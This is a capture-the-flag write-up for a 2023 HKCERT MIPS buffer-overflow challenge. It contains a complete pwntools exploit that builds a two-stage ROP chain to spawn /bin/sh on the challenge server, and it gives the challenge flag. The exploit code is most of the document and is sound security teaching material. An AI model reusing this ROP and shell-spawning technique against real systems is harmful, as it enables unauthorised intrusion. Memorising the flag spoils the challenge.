# mips rop

## Challenge

Simple buffer-overflow challenge in MIPS 32-bit big-endian.

## Solution

There's a call to `gets`, no PIE, and no canary.
We can trivially overflow the buffer and control IP through ROP.

The binary is statically linked so we have a large number of gadgets available.

We first set up a call to `gets` to write to a known writeable address, then stackpivot to this address.
This is primarily useful for placing the string "/bin/sh" at a known address.
In this call, we also have to write our second stage ROP chain.

We then set up our registers and execute a syscall to execve /bin/sh and spawn a shell.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host chal.hkcert23.pwnable.hk --port 28151 rop
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'rop')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'chal.hkcert23.pwnable.hk'
port = int(args.PORT or 28151)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     mips-32-big
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

move_a0_s0 = 0x41f650
'''
  41f650:       02002025        move    a0,s0
  41f654:       8fbf0024        lw      ra,36(sp)
  41f658:       8fb00020        lw      s0,32(sp)
  41f65c:       03e00008        jr      ra
'''

addiu_sp_sp = 0x400840
'''
  400840:       8fbf0064        lw      ra,100(sp)
  400844:       8fbe0060        lw      s8,96(sp)
  400848:       27bd0068        addiu   sp,sp,104
  40084c:       03e00008        jr      ra
'''

gets = 0x400824
'''
  400824:       8f82806c        lw      v0,-32660(gp)
  400828:       0040c825        move    t9,v0
  40082c:       0411212c        bal     408ce0 <_IO_gets>
  400830:       00000000        nop
  400834:       8fdc0010        lw      gp,16(s8)
  400838:       00001025        move    v0,zero
  40083c:       03c0e825        move    sp,s8
  400840:       8fbf0064        lw      ra,100(sp)
  400844:       8fbe0060        lw      s8,96(sp)
  400848:       27bd0068        addiu   sp,sp,104
  40084c:       03e00008        jr      ra
'''

move_a2_s2 = 0x40a9c4
'''
  40a9c4:       8fb90028        lw      t9,40(sp)
  40a9c8:       02403025        move    a2,s2
  40a9cc:       afa20014        sw      v0,20(sp)
  40a9d0:       02473821        addu    a3,s2,a3
  40a9d4:       afa40018        sw      a0,24(sp)
  40a9d8:       24a5002c        addiu   a1,a1,44
  40a9dc:       afb6001c        sw      s6,28(sp)
  40a9e0:       02602025        move    a0,s3
  40a9e4:       8fa2002c        lw      v0,44(sp)
  40a9e8:       0320f809        jalr    t9
'''

move_a2_s8_a1_s3 = 0x40368c
'''
  40368c:       8fb9002c        lw      t9,44(sp)
  403690:       03c03025        move    a2,s8
  403694:       02602825        move    a1,s3
  403698:       0320f809        jalr    t9
'''

lw_s6 = 0x43f52c
'''
  43f52c:       8fbf0054        lw      ra,84(sp)
  43f530:       8fb60050        lw      s6,80(sp)
  43f534:       8fb5004c        lw      s5,76(sp)
  43f538:       8fb40048        lw      s4,72(sp)
  43f53c:       8fb30044        lw      s3,68(sp)
  43f540:       8fb20040        lw      s2,64(sp)
  43f544:       8fb1003c        lw      s1,60(sp)
  43f548:       8fb00038        lw      s0,56(sp)
  43f54c:       03e00008        jr      ra
'''

move_v0_s0 = 0x44f84c
'''
  44f84c:       8fbf0134        lw      ra,308(sp)
  44f850:       02001025        move    v0,s0
  44f854:       8fb00130        lw      s0,304(sp)
  44f858:       03e00008        jr      ra
'''

syscall = 0x40042c
'''
  40042c:       0000000c        syscall
'''

SYS_execve = 4011

rw = 0x492400
sp = 0x50

def move_sp(n, x):
    global sp
    sp += n
    return x

payload = b''

payload += flat({
    sp -  8 : rw,
    sp -  4 : move_a0_s0,
    sp + 32 : rw,
    sp + 36 : move_sp(40, move_a0_s0),

    sp + 36 : move_sp(40, gets),
})

payload += b'\n'

sp = 0
payload += flat({
    0: b'/bin/sh\0',

    sp + 96 : 0,
    sp + 100 : move_sp(104, move_a2_s8_a1_s3),

    sp + 44 : move_a0_s0,
    sp + 32 : rw,
    sp + 36 : move_sp(40, move_a0_s0),

    sp + 32 : SYS_execve,
    sp + 36 : move_sp(40, move_v0_s0),

    sp + 308 : syscall,
})

# open('payload', 'wb').write(payload)

io = start()
io.sendlineafter(b'input : \n', payload)
io.interactive()
```

## Flag

```
hkcert23{th4nk5_f0r_501ving_4ga1n}
```
